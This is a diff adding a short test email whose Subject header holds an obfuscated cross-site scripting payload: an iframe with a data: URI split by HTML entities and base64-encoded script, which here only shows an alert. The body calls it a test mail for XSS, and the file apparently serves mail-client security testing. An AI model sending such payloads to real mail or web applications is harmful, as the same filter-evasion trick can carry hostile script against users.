@@ -1,0 +1,7 @@
+From: "Kyle Rivera" <www.arbowww@mscrm-addon.com>
+To: kristi.giron@cfisd.net, hollyw@email.msn.com, phillip.love@enron.com, 
+Subject: <iframe src="dat&NewLine;a&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
